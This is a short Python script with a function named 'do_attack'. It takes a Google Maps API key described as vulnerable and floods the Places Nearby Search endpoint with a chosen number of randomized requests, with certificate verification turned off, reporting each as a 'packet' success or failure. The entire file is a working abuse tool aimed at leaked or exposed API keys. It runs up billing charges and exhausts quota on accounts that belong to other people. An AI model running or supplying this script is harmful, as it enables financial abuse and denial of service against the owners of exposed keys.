#!/usr/bin/python3
import requests, warnings, json, sys, os, random, colorama, calendar, time
from colorama import Fore
requests.packages.urllib3.disable_warnings()
colorama.init(autoreset=True)

def generate_parameter():
    keyword = open("datasets/names.txt","r")
    type = open("datasets/gmap_types.txt","r")

    keyword_line = next(keyword)
    type_line = next(type)
    lat_a = random.randrange(-89,90)
    lat_b = random.randrange(0,100000)
    lng_a = random.randrange(-89,90)
    lng_b = random.randrange(0,100000)
    radius = random.randrange(5000,20000)

    for i, k_line in enumerate(keyword,2):
        if random.randrange(i):
            continue
        keyword_line = k_line

    for j, t_line in enumerate(type,2):
        if random.randrange(j):
            continue
        type_line = t_line

    return f"keyword={keyword_line.strip()}&location=-{lat_a}.{lat_b},{lng_a}.{lng_b}&radius={radius}&type={type_line.strip()}"


def generate_url(apikey, parameter):
    return f"https://maps.googleapis.com/maps/api/place/nearbysearch/json?{parameter}&key={apikey}"

def do_attack():
    apikey = str(input("Enter Google Maps API Key that vulnerable to nearby search place: "))
    count = int(input("Enter packet count: "))
    print (Fore.GREEN + "[+] Sending Packets")
    for i in range(count):
        url = generate_url(apikey, generate_parameter())
        print(url)
        response = requests.get(url, verify=False)
        if response.text.find("errorMessage") < 0:
            print(Fore.GREEN + f"[+] Packet sequence-{i+1} Succeed: No Error Message")
        else:
            print(Fore.RED + f"[-] Packet sequence-{i+1} Failed: Error Message Exist")

if __name__ == "__main__":
    do_attack()

